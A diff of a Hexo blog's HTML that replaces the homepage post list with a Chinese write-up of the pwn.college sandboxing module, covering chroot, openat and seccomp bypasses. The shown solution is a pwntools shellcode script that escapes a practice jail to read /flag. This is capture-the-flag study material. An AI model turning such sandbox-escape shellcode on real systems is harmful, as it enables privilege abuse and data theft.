@@ -20,30 +20,33 @@
     var CONFIG = {"hostname":"dreamfo1l.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="独立之精神，自由之思想。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="dreamfoil">
-<meta property="og:url" content="https://dreamfo1l.github.io/index.html">
+  <meta name="description" content="pwn.college sanboxing  Module  chrootchroot 改变根目录，以达到隔离的状态。 openat linkatopenat  linkat 等后缀为at的函数可以打开一个目录文件描述符，然后用相对路径进行操作。 1234int	open(const char *path, int oflag, ...);int  openat(int fd, const cha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SandBoxing">
+<meta property="og:url" content="https://dreamfo1l.github.io/2022/12/30/SandBoxing/index.html">
 <meta property="og:site_name" content="dreamfoil">
-<meta property="og:description" content="独立之精神，自由之思想。">
+<meta property="og:description" content="pwn.college sanboxing  Module  chrootchroot 改变根目录，以达到隔离的状态。 openat linkatopenat  linkat 等后缀为at的函数可以打开一个目录文件描述符，然后用相对路径进行操作。 1234int	open(const char *path, int oflag, ...);int  openat(int fd, const cha">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-12-30T11:26:49.000Z">
+<meta property="article:modified_time" content="2022-12-30T11:29:07.779Z">
 <meta property="article:author" content="dreamfoil">
+<meta property="article:tag" content="PwnCollege">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://dreamfo1l.github.io/">
+<link rel="canonical" href="https://dreamfo1l.github.io/2022/12/30/SandBoxing/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>dreamfoil</title>
+  <title>SandBoxing | dreamfoil</title>
   
 
 
@@ -146,9 +149,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -164,10 +168,9 @@
       <meta itemprop="name" content="dreamfoil">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/30/SandBoxing/" class="post-title-link" itemprop="url">SandBoxing</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          SandBoxing
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -191,7 +194,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>pwn.college sanboxing  Module</p>
+        <p>pwn.college sanboxing  Module</p>
 <hr>
 <h2 id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h2><p>chroot 改变根目录，以达到隔离的状态。</p>
 <h2 id="openat-linkat"><a href="#openat-linkat" class="headerlink" title="openat linkat"></a>openat linkat</h2><p>openat  linkat 等后缀为at的函数可以打开一个目录文件描述符，然后用相对路径进行操作。</p>
@@ -322,668 +325,34 @@ a = p.poll()				#获取进程退出的状态码
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyjail_level13&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.write(<span class="number">4</span>,<span class="string">&quot;read_file:/flag&quot;</span>,<span class="number">20</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">4</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    /* push b&#x27;print_msg:######   必须push8个字节不然有0会中断输出*/ </span></span><br><span class="line"><span class="string">    mov rax, 0x2323232323233a67</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x736d5f746e697270</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.write(<span class="number">4</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">100</span>)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/PwnCollege/" rel="tag"># PwnCollege</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2022/11/23/Shellcode-Injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/23/Shellcode-Injection/" class="post-title-link" itemprop="url">Shellcode Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-23 00:03:43 / 修改时间：00:07:56" itemprop="dateCreated datePublished" datetime="2022-11-23T00:03:43+08:00">2022-11-23</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwn.college Shellcode Injection Module</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/11/23/Shellcode-Injection/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2022/11/03/Sessions-Desktops-and-Windows-Stations/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/03/Sessions-Desktops-and-Windows-Stations/" class="post-title-link" itemprop="url">Sessions概念,穿透Session隔离</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-03 15:14:15" itemprop="dateCreated datePublished" datetime="2022-11-03T15:14:15+08:00">2022-11-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-07 18:02:55" itemprop="dateModified" datetime="2022-11-07T18:02:55+08:00">2022-11-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Sessions,Desktops,Windows Stations 概念</p>
-<p>Session隔离机制以及穿透方法</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/11/03/Sessions-Desktops-and-Windows-Stations/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/23/Shellcode-Injection/" rel="prev" title="Shellcode Injection">
+      <i class="fa fa-chevron-left"></i> Shellcode Injection
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
   
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2022/10/13/Assembly/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/10/13/Assembly/" class="post-title-link" itemprop="url">Assembly</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-10-13 03:36:13" itemprop="dateCreated datePublished" datetime="2022-10-13T03:36:13+08:00">2022-10-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-01 15:01:30" itemprop="dateModified" datetime="2022-11-01T15:01:30+08:00">2022-11-01</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Pwn.college Assembly Module</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/10/13/Assembly/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2022/10/13/Program%20Interaction/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/10/13/Program%20Interaction/" class="post-title-link" itemprop="url">Program Interaction</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-10-13 03:00:10 / 修改时间：11:28:35" itemprop="dateCreated datePublished" datetime="2022-10-13T03:00:10+08:00">2022-10-13</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwn college 第一个模块</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/10/13/Program%20Interaction/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/09/06/Mimikatz/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/09/06/Mimikatz/" class="post-title-link" itemprop="url">Mimikatz在Windows 11上运行的问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-09-06 21:12:10" itemprop="dateCreated datePublished" datetime="2021-09-06T21:12:10+08:00">2021-09-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-02 17:05:44" itemprop="dateModified" datetime="2021-10-02T17:05:44+08:00">2021-10-02</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>sekurlsa</strong>模块无法正常抓取密码哈希，报错如图</p>
-<p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727163838089.png" alt="image-20210727163838089"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/09/06/Mimikatz/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/06/10/Pointer%20Analysis%20Foundations/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/10/Pointer%20Analysis%20Foundations/" class="post-title-link" itemprop="url">Pointer Analysis Foundations</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-10 00:44:10 / 修改时间：00:44:26" itemprop="dateCreated datePublished" datetime="2021-06-10T00:44:10+08:00">2021-06-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><ol>
-<li>指针分析的规则</li>
-<li>怎样实现指针分析</li>
-<li>指针分析的算法</li>
-<li>实现过程内指针分析与过程间指针分析</li>
-</ol>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/06/10/Pointer%20Analysis%20Foundations/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/06/08/Pointer%20Analysis%20Introductions/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/08/Pointer%20Analysis%20Introductions/" class="post-title-link" itemprop="url">Pointer Analysis  Introductions</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-06-08 08:44:10" itemprop="dateCreated datePublished" datetime="2021-06-08T08:44:10+08:00">2021-06-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-10 00:48:48" itemprop="dateModified" datetime="2021-06-10T00:48:48+08:00">2021-06-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><ol>
-<li>什么是指针分析？</li>
-<li>影响指针分析的关键因素是什么？</li>
-<li>指针分析要分析哪些指令？</li>
-</ol>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/06/08/Pointer%20Analysis%20Introductions/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/06/06/Interprocedural%20Analysis/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/06/Interprocedural%20Analysis/" class="post-title-link" itemprop="url">Interprocedural Analysis</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-06 21:12:10 / 修改时间：21:45:34" itemprop="dateCreated datePublished" datetime="2021-06-06T21:12:10+08:00">2021-06-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><ol>
-<li>Call Graph构建</li>
-<li>Class Hierarchy Analysis(CHA)</li>
-<li>过程间控制流图</li>
-<li>过程间数据流分析</li>
-</ol>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/06/06/Interprocedural%20Analysis/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/06/06/Data%20Flow%20Analysis/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="dreamfoil">
-      <meta itemprop="description" content="独立之精神，自由之思想。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dreamfoil">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/06/Data%20Flow%20Analysis/" class="post-title-link" itemprop="url">Data Flow Analysis</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-06-06 10:12:10" itemprop="dateCreated datePublished" datetime="2021-06-06T10:12:10+08:00">2021-06-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-07 12:50:50" itemprop="dateModified" datetime="2021-06-07T12:50:50+08:00">2021-06-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>三种数据流分析算法学习</p>
-<p>1.Reaching Definitions Analysis</p>
-<p>2.Live Variables Analysis</p>
-<p>3.Available Expression Analysis</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/06/06/Data%20Flow%20Analysis/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
 
 
 
@@ -1035,6 +404,7 @@ a = p.poll()				#获取进程退出的状态码
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#chroot"><span class="nav-text">chroot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openat-linkat"><span class="nav-text">openat linkat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#seccomp"><span class="nav-text">seccomp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%9C%AA%E6%A3%80%E6%9F%A5arch"><span class="nav-text">绕过未检查arch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#X64%E4%B8%8B%E4%BD%BF%E7%94%A8-X32"><span class="nav-text">X64下使用 X32</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4"><span class="nav-text">测信道爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="nav-text">什么是侧信道爆破？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4%E7%9A%84%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="nav-text">侧信道爆破的整体思路:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1-chroot"><span class="nav-text">level 1  chroot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3"><span class="nav-text">level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-4-seccomp"><span class="nav-text">level 4 seccomp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-5"><span class="nav-text">level 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-6"><span class="nav-text">level 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-7"><span class="nav-text">level 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-8"><span class="nav-text">level 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-9"><span class="nav-text">level 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-10-11-12-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4"><span class="nav-text">level 10  11 12  侧信道爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level13"><span class="nav-text">level13</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
